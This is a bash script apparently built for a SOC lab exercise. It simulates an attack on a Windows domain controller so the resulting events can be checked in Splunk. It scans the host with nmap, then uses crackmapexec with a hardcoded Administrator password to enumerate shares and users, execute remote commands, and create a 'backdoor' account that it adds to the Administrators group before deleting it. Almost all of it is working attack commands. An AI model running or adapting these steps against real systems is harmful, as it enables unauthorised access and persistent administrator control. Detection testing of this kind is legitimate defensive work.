#!/bin/bash

echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║     SOC PROJECT: WINDOWS DC ATTACK SIMULATION                ║"
echo "║     Target: DC01.cyberlab.local (192.168.1.5)                ║"
echo "║     Password: P@ssw0rd123                                    ║"
echo "╚═══════════════════════════════════════════════════════════════╝"

mkdir -p ~/soc-project/attack-logs
LOG_FILE="~/soc-project/attack-logs/full_attack_$(date +"%Y%m%d_%H%M%S").log"
exec > >(tee -a ${LOG_FILE}) 2>&1

echo "[+] Attack started at: $(date)"
echo ""

# PHASE 1: Reconnaissance
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📡 PHASE 1: RECONNAISSANCE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
nmap -sS -p 445,3389,5985 -Pn 192.168.1.5
nmap -sV -p 445,3389,5985 -Pn 192.168.1.5

# PHASE 2: SMB Attacks
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔑 PHASE 2: SMB ATTACKS"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
crackmapexec smb 192.168.1.5 -u Administrator -p P@ssw0rd123 --shares
crackmapexec smb 192.168.1.5 -u Administrator -p P@ssw0rd123 --users
crackmapexec smb 192.168.1.5 -u Administrator -p P@ssw0rd123 --pass-pol

# PHASE 3: Command Execution
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "⚡ PHASE 3: COMMAND EXECUTION"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
crackmapexec smb 192.168.1.5 -u Administrator -p P@ssw0rd123 -x "whoami"
crackmapexec smb 192.168.1.5 -u Administrator -p P@ssw0rd123 -x "whoami /priv"
crackmapexec smb 192.168.1.5 -u Administrator -p P@ssw0rd123 -x "ipconfig /all"

# PHASE 4: Persistence
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "💀 PHASE 4: PERSISTENCE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
crackmapexec smb 192.168.1.5 -u Administrator -p P@ssw0rd123 -x "net user backdoor Backdoor123! /add"
crackmapexec smb 192.168.1.5 -u Administrator -p P@ssw0rd123 -x "net localgroup Administrators backdoor /add"
crackmapexec smb 192.168.1.5 -u Administrator -p P@ssw0rd123 -x "net user backdoor"

# PHASE 5: Cleanup
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🧹 PHASE 5: CLEANUP"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
crackmapexec smb 192.168.1.5 -u Administrator -p P@ssw0rd123 -x "net user backdoor /delete"

echo ""
echo "✅ Attack Simulation Complete!"
echo "📊 Check Splunk: http://192.168.1.10:8000"
